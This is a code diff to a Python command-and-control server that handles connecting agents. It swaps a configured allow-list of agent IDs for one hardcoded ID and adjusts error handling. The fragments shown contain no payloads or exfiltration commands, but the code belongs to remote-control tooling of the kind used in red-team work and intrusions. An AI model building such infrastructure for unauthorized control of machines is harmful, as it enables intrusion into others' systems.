@@ -1,5 +1,4 @@
 import os
-import yaml
 from misc.file import File
 from protocol import validator
 from protocol.c2_protocol import *
@@ -8,8 +7,7 @@ import c2_commands
 
 
 agents_output_dir = "agents_output"
-server_config = yaml.safe_load(open("c2_config.yml"))
-allowed_agent_uuid_list = server_config["allowed_agent_uuid_list"]
+allowed_agent_uuid = "638f0f93"
 
 
 class C2:
@@ -47,8 +45,8 @@ class C2:
 
 
     def handle_command_from_ui(self, command_id):
-        command_arguments = c2_commands.handle_command_request(command_id)
         try:
+            command_arguments = c2_commands.handle_command_request(command_id)
             self.send_and_wait_for_response(command_id, command_arguments)
         except (BrokenPipeError, ConnectionResetError, socket.error) as e:
             print(f"[-] Disconnected with error: {e}\nWill try to reconnect in {self.reconnect_wait_period} seconds...")
@@ -74,9 +72,8 @@ class C2:
         print(f"[+] Received agent UUID: {agent_uuid}")
         # todo: check if agent uuid is allowed agent to communicate with this C2. if not return status error and refuse to handle further requests from this agent uuid
         # optional
-        if agent_uuid not in allowed_agent_uuid_list:
-            self.c2_protocol.c2_hello_send(agent_uuid, status=MESSAGE_STATUS_ERROR)
-            raise Exception(f"[-] {agent_uuid} is not in the allowed UUID list in the c2_config.yml file")
+        if agent_uuid != allowed_agent_uuid:
+            raise Exception(f"[-] {agent_uuid} is not allowed UUID")
 
         self.create_agent_data_dirs(agent_uuid)
         self.c2_protocol.c2_hello_send(agent_uuid, status=MESSAGE_STATUS_OK)
